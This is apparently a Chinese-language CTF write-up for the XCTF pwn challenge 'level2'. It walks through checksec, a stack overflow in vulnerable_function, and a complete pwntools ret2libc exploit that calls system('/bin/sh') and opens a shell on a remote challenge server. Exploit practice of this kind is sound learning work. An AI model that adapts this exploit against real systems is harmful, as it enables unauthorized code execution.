---
title: "XCTF Pwn Level2"
date: 2020-01-15T20:46:28+08:00
author: NiceSeven
categories:
  - XCTF
tags:
  - Pwn
---

# level2

首先checksec一下查看开启了什么防护

![image-20200115214802127](/images/image-20200115214802127.png)

32位程序

RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击

RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表

NX:内存栈不可执行保护机制，传入栈的数据不可直接执行意味着不能在栈上传shellcode执行，可以使用rop链绕过

本地运行一下查看程序的功能

![image-20200115215243092](/images/image-20200115215243092.png)

运行程序后输出Input：，等待输入之后输出Hello,World

拖入IDA分析

![image-20200115220008513](/images/image-20200115220008513.png)

进入vulnerable _function()函数查看

![image-20200115220120545](/images/image-20200115220120545.png)

跟level0一样的栈溢出漏洞，88h的栈可以写入0x100的数据明显的栈溢出

查看是否有后门，shift+f12查看字符串，可以发现system函数与/bin/sh字符串

![image-20200115224845949](/images/image-20200115224845949.png)

但是这里的system函数参数没有写，需要我们自己将/bin/sh作为参数传入system函数，考查的是基础ROP中的ret2libc

![image-20200115224619261](/images/image-20200115224619261.png)

ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh\")，故而此时我们需要知道 system 函数的地址与字符串/bin/sh的地址

本题有2个system函数地址，我们需要使用的是_system函数，因为它是属于plt段，若使用extern段的system无法getshell

我们使用symbols()函数获取的地址是plt段中的_system

![image-20200115225813474](/images/image-20200115225813474.png)

写exp

```python
#!/usr/bin/python
#coding=UTF-8
from pwn import *
sh = remote('111.198.29.45',34150)
elf = ELF('./level2')
system_addr = elf.symbols['system']
binsh_addr = next(elf.search('/bin/sh'))
payload = 'a' * 0x88 + 'b' * 4 + p32(system_addr) + 'c' * 4 + p32(binsh_addr)
#0x88是填充栈，bbbb用来填充ebp，之后就是retn用system的地址覆盖，程序执行完之后就返回到system
#在进入system函数之后，正常的调用会有一个返回的地址这里使用cccc覆盖掉
#最后就是将/bin/sh的地址作为system()的参数传入，如此一来栈溢出之后就会执行system("/bin/sh")
sh.sendlineafter('Input:',payload)#在接收到Input:之后传入payload
sh.interactive()
```

注意这里的next()函数的用法，前置条件为开启了程序句柄elf = ELF(\'xxxx\')

next(elf.search(\'some_characters\'))找到包含 some_characters(字符串，汇编代码或者某个数值)的地址

![image-20200115235516033](/images/image-20200115235516033.png)